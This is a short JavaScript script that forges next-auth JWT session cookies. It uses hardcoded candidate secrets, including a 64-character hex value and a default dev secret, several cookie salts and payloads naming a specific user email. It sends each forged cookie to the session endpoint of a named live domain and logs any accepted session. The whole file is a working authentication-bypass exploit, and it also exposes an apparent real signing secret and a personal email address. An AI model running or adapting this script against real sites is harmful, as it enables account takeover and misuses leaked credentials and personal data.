import { encode } from "next-auth/jwt";

const secrets = [
  "2bbba0c11c00c3e6e9bd8ea834302604aaed69b4fbef185c4398d84facdca35d",
  "dev-secret-change-in-production"
];

const salts = [
  "__Secure-next-auth.session-token",
  "next-auth.session-token",
  "__Secure-authjs.session-token",
  "authjs.session-token",
  "next-auth.jwt"
];

const payloads = [
  {
    id: "5cac6639-a30a-4a63-b732-f76e4ee21575",
    sub: "5cac6639-a30a-4a63-b732-f76e4ee21575",
    email: "devkev@manifestfts.com"
  },
  {
    id: "5cac6639-a30a-4a63-b732-f76e4ee21575",
    sub: "5cac6639-a30a-4a63-b732-f76e4ee21575",
    email: "devkev@manifestfts.com",
    name: "devkev"
  }
];

for (const secret of secrets) {
  for (const salt of salts) {
    for (const payload of payloads) {
      const token = await encode({ secret, salt, token: payload, maxAge: 3600 });
      const cookieName = salt.includes("jwt") ? "next-auth.session-token" : salt;
      const res = await fetch("https://jongo.manifest-fts.com/api/auth/session", {
        headers: {
          cookie: `${cookieName}=${token}`
        }
      });
      const text = await res.text();
      if (text !== "{}") {
        console.log("HIT", secret.slice(0, 8), salt, JSON.stringify(payload), res.status, text);
      }
    }
  }
}

console.log("probe complete");
